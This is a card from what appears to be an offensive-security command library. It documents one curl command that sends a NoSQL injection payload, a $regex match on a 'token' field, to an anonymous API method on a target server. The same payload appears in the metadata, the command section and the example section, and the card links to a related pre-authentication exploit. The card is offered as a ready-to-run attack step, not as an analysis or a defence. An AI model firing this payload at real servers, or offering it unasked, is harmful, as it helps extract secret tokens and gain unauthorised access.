---
id: cmd-curl-nosql-test
data: >-
  curl -X POST 'http://target:3000/api/v1/method.callAnon' -H 'Content-Type:
  application/json' -d
  '{"msg":"getPasswordPolicy","params":[{"token":{"$regex":"^a"}}],"id":"1"}'
tags:
  - injection
  - test
type: command
output: Policy JSON or error
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:19.877Z'
verified: false
validated: true
submitted: true
---
# curl-nosql-payload-test

## Command

```bash
curl -X POST 'http://target:3000/api/v1/method.callAnon' -H 'Content-Type: application/json' -d '{"msg":"getPasswordPolicy","params":[{"token":{"$regex":"^a"}}],"id":"1"}'
```

## Description

Tests a single NoSQL injection payload manually with curl to verify regex matching.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -d | DDP payload with $regex | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://target:3000/api/v1/method.callAnon' -H 'Content-Type: application/json' -d '{"msg":"getPasswordPolicy","params":[{"token":{"$regex":"^a"}}],"id":"1"}'
```

## Expected Output

Success: {"msg":"result", "result": {policy data}}; Failure: Error JSON.

## Related

- [[commands/run-pre-auth-nosqli-exploit]]
